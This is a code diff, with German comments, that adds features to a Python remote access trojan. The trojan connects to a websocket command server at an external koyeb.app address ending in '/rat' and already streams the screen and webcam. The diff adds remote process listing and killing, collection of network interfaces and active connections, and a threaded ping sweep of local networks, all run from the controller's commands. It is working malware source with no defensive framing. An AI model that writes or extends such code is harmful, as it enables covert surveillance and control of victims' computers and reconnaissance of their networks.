@@ -23,6 +23,10 @@ from cryptography.hazmat.backends import default_backend
 import tempfile
 import threading
 import time
+import psutil
+import subprocess
+import ipaddress
+import struct
 
 # --- Konfiguration & Globals ---
 SERVER_URI = "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app:443/rat"
@@ -535,7 +539,7 @@ class ScreenStreamer:
 
 screen_streamer = ScreenStreamer()
 
-{ # === Webcam Streaming ===
+# === Webcam Streaming ===
 class WebcamStreamer:
     def __init__(self):
         self._task = None
@@ -588,7 +592,131 @@ class WebcamStreamer:
         except Exception as e:
             await self._ws.send(json.dumps({"type": "command_output", "output": f"Webcam Fehler: {e}"}))
 
-webcam_streamer = WebcamStreamer() }
+webcam_streamer = WebcamStreamer()
+
+# === Prozess-Management ===
+def get_process_list():
+    """Gibt eine Liste aller laufenden Prozesse zurück"""
+    try:
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent', 'username']):
+            try:
+                proc_info = proc.info
+                processes.append({
+                    'pid': proc_info['pid'],
+                    'name': proc_info['name'],
+                    'memory_mb': round(proc_info['memory_info'].rss / 1024 / 1024, 2) if proc_info['memory_info'] else 0,
+                    'cpu_percent': proc_info['cpu_percent'] or 0,
+                    'username': proc_info['username'] or 'N/A'
+                })
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+        
+        # Sortiere nach CPU-Nutzung (höchste zuerst)
+        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
+        return processes[:50]  # Top 50 Prozesse
+    except Exception as e:
+        return f"Fehler beim Abrufen der Prozessliste: {e}"
+
+def kill_process(pid):
+    """Beendet einen Prozess"""
+    try:
+        pid = int(pid)
+        process = psutil.Process(pid)
+        process_name = process.name()
+        process.terminate()
+        
+        # Warte 3 Sekunden auf ordentliches Beenden
+        try:
+            process.wait(timeout=3)
+        except psutil.TimeoutExpired:
+            # Forceful kill wenn nötig
+            process.kill()
+            
+        return f"Prozess {process_name} (PID: {pid}) wurde beendet."
+    except psutil.NoSuchProcess:
+        return f"Prozess mit PID {pid} existiert nicht."
+    except psutil.AccessDenied:
+        return f"Keine Berechtigung zum Beenden von PID {pid}."
+    except Exception as e:
+        return f"Fehler beim Beenden des Prozesses: {e}"
+
+# === Netzwerk-Tools ===
+def get_network_info():
+    """Gibt detaillierte Netzwerkinformationen zurück"""
+    try:
+        info = []
+        
+        # Netzwerk-Interfaces
+        info.append("=== Netzwerk-Interfaces ===")
+        for interface, addrs in psutil.net_if_addrs().items():
+            info.append(f"\nInterface: {interface}")
+            for addr in addrs:
+                if addr.family == socket.AF_INET:
+                    info.append(f"  IPv4: {addr.address}")
+                    info.append(f"  Netmask: {addr.netmask}")
+                elif addr.family == socket.AF_INET6:
+                    info.append(f"  IPv6: {addr.address}")
+        
+        # Netzwerk-Statistiken
+        info.append("\n=== Netzwerk-Statistiken ===")
+        net_io = psutil.net_io_counters()
+        info.append(f"Bytes gesendet: {net_io.bytes_sent:,}")
+        info.append(f"Bytes empfangen: {net_io.bytes_recv:,}")
+        info.append(f"Pakete gesendet: {net_io.packets_sent:,}")
+        info.append(f"Pakete empfangen: {net_io.packets_recv:,}")
+        
+        # Aktive Verbindungen
+        info.append("\n=== Aktive Verbindungen (Top 10) ===")
+        connections = psutil.net_connections(kind='inet')
+        active_connections = [conn for conn in connections if conn.status == 'ESTABLISHED'][:10]
+        
+        for conn in active_connections:
+            local = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
+            remote = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
+            info.append(f"  {local} -> {remote} (PID: {conn.pid or 'N/A'})")
+        
+        return "\n".join(info)
+    except Exception as e:
+        return f"Fehler beim Abrufen der Netzwerkinformationen: {e}"
+
+def scan_network_range(network_range):
+    """Scannt einen Netzwerkbereich nach aktiven Hosts"""
+    try:
+        network = ipaddress.ip_network(network_range, strict=False)
+        active_hosts = []
+        
+        def ping_host(ip):
+            try:
+                if platform.system().lower() == "windows":
+                    result = subprocess.run(['ping', '-n', '1', '-w', '1000', str(ip)], 
+                                          capture_output=True, text=True, timeout=5)
+                else:
+                    result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], 
+                                          capture_output=True, text=True, timeout=5)
+                if result.returncode == 0:
+                    active_hosts.append(str(ip))
+            except:
+                pass
+        
+        threads = []
+        for ip in network.hosts():
+            if len(threads) >= 20:  # Maximal 20 parallele Threads
+                for t in threads:
+                    t.join()
+                threads = []
+            
+            t = threading.Thread(target=ping_host, args=(ip,))
+            t.start()
+            threads.append(t)
+        
+        # Warte auf alle Threads
+        for t in threads:
+            t.join()
+        
+        return f"Aktive Hosts in {network_range}: {', '.join(active_hosts) if active_hosts else 'Keine gefunden'}"
+    except Exception as e:
+        return f"Fehler beim Netzwerk-Scan: {e}"
 
 def shutdown_or_restart(action):
     try:
@@ -787,6 +915,33 @@ async def process_commands(websocket):
                 cams = scan_network_cameras()
                 response["type"] = "command_output"
                 response["output"] = "Gefundene Netzwerk-Kameras:\n" + ("\n".join(cams) if cams else "Keine gefunden.")
+            elif action == "process_list":
+                processes = get_process_list()
+                if isinstance(processes, str):  # Error message
+                    response["output"] = processes
+                else:
+                    # Format process list
+                    output_lines = ["=== Laufende Prozesse (Top 50) ===\n"]
+                    output_lines.append("PID\t\tName\t\t\tMemory (MB)\tCPU %\t\tUser")
+                    output_lines.append("-" * 80)
+                    for proc in processes:
+                        output_lines.append(f"{proc['pid']}\t\t{proc['name'][:20]:<20}\t{proc['memory_mb']:<10}\t{proc['cpu_percent']:<8}\t{proc['username']}")
+                    response["output"] = "\n".join(output_lines)
+                response["type"] = "command_output"
+            elif action == "kill_process":
+                pid = command.get("pid") or command.get("argument")
+                if not pid:
+                    response["output"] = "Fehler: PID ist erforderlich. Verwendung: /kill_process <PID>"
+                else:
+                    response["output"] = kill_process(pid)
+                response["type"] = "command_output"
+            elif action == "network_info":
+                response["type"] = "command_output"
+                response["output"] = get_network_info()
+            elif action == "network_scan":
+                network_range = command.get("range") or command.get("argument") or "192.168.1.0/24"
+                response["type"] = "command_output"
+                response["output"] = scan_network_range(network_range)
             else:
                 response["status"] = "error"
                 response["error"] = "Unbekannte Aktion"
